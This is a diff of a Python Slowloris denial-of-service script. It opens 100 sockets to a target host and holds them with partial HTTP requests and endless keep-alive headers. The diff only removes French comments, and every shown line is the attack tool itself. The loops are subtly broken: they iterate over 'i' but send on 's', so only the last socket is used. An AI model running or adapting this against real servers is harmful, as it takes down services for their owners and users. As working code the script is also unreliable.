@@ -20,7 +20,7 @@ def slowloris(target,port):
 	socket_count = 100
 	print("Attacking {}:{} with {} packets".format(target,port,socket_count))
 
-	print("Creating sockets...")			#On créer 100 sockets différentes pour créer des connexions différentes
+	print("Creating sockets...")			
 	for i in range(socket_count):
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -31,19 +31,18 @@ def slowloris(target,port):
 		list_of_sockets.append(s)
 	print("Setting up sockets...")
 	for i in list_of_sockets:
-		s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))			#b'Sending: GET /?randint HTTP/1.1\r\n'  -> \r\n est la norme pour faire un retour à la ligne
+		s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))			
 		for header in regular_headers:
-			s.send(bytes("{}\r\n".format(header).encode("utf-8")))			#Header user agent + Accept-language 			
+			s.send(bytes("{}\r\n".format(header).encode("utf-8")))					
 
 	while True:
 		print("Sending keep-alive!")
 		for i in list_of_sockets:
 			try:
-				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))			#b'sending: X-a: 439\r\n'	-> X- signifie en-tête non standart https://docs.oracle.com/en-us/iaas/Content/Balance/Reference/httpheaders.htm  
+				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))			
 			except socket.error:
 				print("error")
 				raise
-
 		time.sleep(15)
 
 
